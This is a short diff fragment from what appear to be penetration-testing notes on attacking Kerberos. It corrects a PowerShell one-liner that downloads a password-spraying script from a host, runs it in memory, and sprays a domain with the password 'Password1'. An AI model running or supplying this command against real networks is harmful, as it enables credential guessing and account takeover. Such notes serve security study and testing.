@@ -259,7 +259,7 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 ``` powershell 
 
-IEX(New-Object Net.WebClient).downloadString('http:///192.168.219.141/DomainPasswordSpray.ps1') ; Invoke-DomainPasswordSpray -Password Password1
+IEX(New-Object Net.WebClient).DownloadString('http://192.168.219.141/DomainPasswordSpray.ps1') ; Invoke-DomainPasswordSpray -Password Password1
 
 ```
 
